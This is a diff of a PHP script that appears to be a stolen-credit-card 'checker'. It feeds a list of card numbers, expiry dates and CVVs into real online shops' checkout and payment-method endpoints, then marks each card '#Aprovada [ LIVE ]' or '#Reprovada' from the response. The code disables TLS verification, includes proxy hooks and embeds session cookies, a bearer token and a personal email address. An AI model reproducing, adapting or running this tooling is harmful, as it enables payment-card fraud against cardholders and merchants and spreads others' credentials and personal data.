@@ -151,7 +151,7 @@ $dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
 
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
+curl_setopt($ch, CURLOPT_URL, 'https://www.europeanestheticshop.com/checkout/OpcSavePaymentInfo/');
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -168,33 +168,32 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: */*',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
-'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTAzNzc2OTUsImp0aSI6IjllZDdiNGI2LWY3ZjYtNDVkYy1hYjk0LTQ0YjhiM2UzOTRmYiIsInN1YiI6InFtNHRxZDk0MnY3aG5oZGoiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InFtNHRxZDk0MnY3aG5oZGoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiZmxvd2JveFVTRCJ9fQ.BxZsubIdIHw6bKjhPFGmgvvlT2G-1IxiHiEFda0ZQpMQblpZXV9wEtX42mYl1e_IJ_sPOIxmFVnHqLSpSQq35g',
-'braintree-version: 2018-05-10',
-'content-type: application/json',
-'origin: https://assets.braintreegateway.com',
-'referer: https://payments.braintree-api.com/',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'cookie: NopCommerce.RecentlyViewedProducts=RecentlyViewedProductIds=41; __RequestVerificationToken=N5PrqU2Pq7LYxEuvFw6kRiD3kDMqglRuPAyhWlSt4-A4uJWOd-aZOI_tarRSV3m2-F4NHwJ6pLS_CU1c4j2uMGQeA0Q1; ASP.NET_SessionId=kgo2dgwwrcgsei4ndipszvjz; NOPCOMMERCE.AUTH=AD8DE3E47476D0F5AF597AD05B3173B108300809F0369902901E6516541CBEC2E8B59DFA3E882DF37945D08CF83F7E9D0EA633794F3989C7736058873B026FCBCB7AB59E05972A72559F7225924CA88EE016BEDF8F9CE3AC02AA1E6B10C1E259D2C9F20389FD871BF318E39EF101FF54F17F5AED09F2F7D5C3B02C25C395EB1F2214C323A75E4B19D53A48D772B9A578D49E92DE; Nop.customer=f7e821bd-d293-4dbf-8f04-a5cbf48c42f2',
+'origin: https://www.europeanestheticshop.com',
+'referer: https://www.europeanestheticshop.com/en/onepagecheckout',
 'user-agent: '.$browser.''
 ));
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"ef6aacb7-c10b-4031-ae87-76960a415dc9"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"2150","streetAddress":"661 STATE ST"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'CardholderName=Vincent+Warner&CardNumber='.$cc.'&ExpireMonth='.$mes1.'&ExpireYear='.$ano.'&CardCode='.$cvv.'');
 
 $b_pago = curl_exec($ch);
 
 curl_close($ch);
 
    // echo $b_pago;
-$token = trim(strip_tags(getstr($b_pago,'"token":"','"')));
-// $token2 = trim(strip_tags(getstr($b_pago,'"client_secret": "','"')));
-$issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
-$issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
-$type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
-$category = trim(strip_tags(getstr($b_pago,'"commercial":"','"')));
+// $token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
+// // $token2 = trim(strip_tags(getstr($b_pago,'"client_secret": "','"')));
+// $issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
+// $issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
+// $type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
+// $category = trim(strip_tags(getstr($b_pago,'"commercial":"','"')));
 
 
 
 
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://shop.flowbox.io/my-account/add-payment-method/');
+curl_setopt($ch, CURLOPT_URL, 'https://www.europeanestheticshop.com/checkout/OpcConfirmOrder/');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -223,19 +222,18 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-'Accept-Encoding: gzip, deflate, br',
-'Accept-Language: en-US,en;q=0.9',
-'Content-Type: application/x-www-form-urlencoded',
-'cookie: wp_lead_uid=aFf1ToFUvHbT7ekZHy5TisZf5Q6vfFEm4K4; inbound_referral_site=Direct Traffic; PHPSESSID=93j8i0950tkm5p4m7ok3bm1urh; tk_ai=woo%3AYiqd435u6S%2BsilM6nccG2OHu; wp_lead_id=51875; lead_data_expire=true; inbound_wpleads_first_name=Vincent; inbound_wpleads_last_name=Warner; inbound_wpleads_country_code=GB; inbound_wpleads_work_phone=05182641524; inbound_wpleads_email_address=pubgkittu%40gmail.com; inbound_wpleads_company_name=Freelancer; wp_lead_list=%7B%22ids%22%3A%5B107%2C106%2C99%5D%7D; woocommerce_items_in_cart=1; woocommerce_cart_hash=ce4cc22b5c6eef9181e5faef0d8263e8; wordpress_logged_in_4bdb882eaf8fe442bf6d602304ef35c9=vincent.warner%7C1591287089%7CLrCZosQGwJnsupQ63KtR6TCUk7bX9l2YDgY2Q29b8Kx%7Cfe74e9f21b206f2f1afa491e9d1cd90ecd67edacf6759ee24da03b01d4ea4337; wp_woocommerce_session_4bdb882eaf8fe442bf6d602304ef35c9=1024%7C%7C1590422323%7C%7C1590418723%7C%7Cc8ac68ab1b427406771f811bb5629a5c; lead_session=20',
-'origin: https://shop.flowbox.io',
-'referer: https://shop.flowbox.io/my-account/add-payment-method/',
-'User-Agent: '.$browser.''
+'accept: */*',
+'accept-encoding: gzip, deflate, br',
+'accept-language: en-US,en;q=0.9',
+'cookie: NopCommerce.RecentlyViewedProducts=RecentlyViewedProductIds=41; __RequestVerificationToken=N5PrqU2Pq7LYxEuvFw6kRiD3kDMqglRuPAyhWlSt4-A4uJWOd-aZOI_tarRSV3m2-F4NHwJ6pLS_CU1c4j2uMGQeA0Q1; ASP.NET_SessionId=kgo2dgwwrcgsei4ndipszvjz; NOPCOMMERCE.AUTH=AD8DE3E47476D0F5AF597AD05B3173B108300809F0369902901E6516541CBEC2E8B59DFA3E882DF37945D08CF83F7E9D0EA633794F3989C7736058873B026FCBCB7AB59E05972A72559F7225924CA88EE016BEDF8F9CE3AC02AA1E6B10C1E259D2C9F20389FD871BF318E39EF101FF54F17F5AED09F2F7D5C3B02C25C395EB1F2214C323A75E4B19D53A48D772B9A578D49E92DE; Nop.customer=f7e821bd-d293-4dbf-8f04-a5cbf48c42f2',
+'origin: https://www.europeanestheticshop.com',
+'referer: https://www.europeanestheticshop.com/en/onepagecheckout',
+'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=braintree_cc&braintree_cc_nonce_key='.$token.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%2273d328dcf44be8424cab79ab25545615%22%2C%22fraud_merchant_id%22%3Anull%7D&wc_braintree_3ds_enabled=&wc_braintree_3ds_active=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fqm4tqd942v7hnhdj%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fqm4tqd942v7hnhdj%22%7D%2C%22merchantId%22%3A%22qm4tqd942v7hnhdj%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%2C%22postal_code%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Discover%22%2C%22Maestro%22%2C%22UK+Maestro%22%2C%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1ZjgyNWU2ZC0xN2RlLTQyZjQtYjY0NS1kNTQ5ODc2YjZlNDIiLCJpYXQiOjE1OTAyOTEzMDAsImV4cCI6MTU5MDI5ODUwMCwiaXNzIjoiNWM4YWExZjJhZGIxNTYyZTAwM2M4YTg0IiwiT3JnVW5pdElkIjoiNWM4YWExZjFhZGIxNTYyZTAwM2M4YTdlIn0.nFc1qpzzNEA-eT5UbnZQZeoBjdwcm4kzuR8mfyt5N4Y%22%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Flowbox%22%2C%22clientId%22%3A%22AT9_4c6CdkXdct5R8OR2ZBHykjWBTit1QTo1FvlmCyrDTsr88rZyMJBxG70udZavExf2GcAkQuuzbud-%22%2C%22privacyUrl%22%3A%22https%3A%2F%2Fshop.flowbox.io%2Fprivacy_policy%2F%22%2C%22userAgreementUrl%22%3A%22https%3A%2F%2Fshop.flowbox.io%2Fterms-and-conditions%2F%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22flowboxUSD%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&woocommerce-add-payment-method-nonce=ca347b5219&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '');
 
 // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
@@ -246,28 +244,28 @@ if (curl_errno($ch)) {
 }
 curl_close($ch);
 
-$message = trim(strip_tags(getstr($result,'<div class="woocommerce-notices-wrapper"><ul class="woocommerce-error" role="alert">','</ul>')));
-// $code = trim(strip_tags(getstr($result,'"message":"','"')));
+$message = trim(strip_tags(getstr($result,'div class=\"message-error\"\u003e\r\n                    \u003cul\u003e\r\n                            \u003cli\u003e','\u003c/li\u003e\r\n                    \u003c/ul\u003e\r\n                \u003c/div\u003e\r\n        \u003c/div\u003e\r\n    \r\n\u003c/div\u003e\r\n"')));
+ // $code = trim(strip_tags(getstr($result,'"status":"','"')));
  // $message2 = trim(strip_tags(getstr($result,'"decline_code": "','"')));
 
 
 //////////////////////// BIN INFO ////////////////////////////////
 
 /////////////////// RESULT ////////////////////////////////////
-if(strpos($result,'Payment method successfully added')){
-  echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
+if(strpos($result,'Payment error')){
+       echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
+
+
    }
-elseif(strpos($result,'There has been a critical error on your website')){
-     echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ 3 R R 0 R ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
+elseif(strpos($result,'Insufficient Funds')){
+  echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
    }
 else {
+
+  echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
+
 // updatecart();
-
-     echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
-
-
-
-  }
+}
 curl_close($curl);
 ob_flush();
        // echo $result;
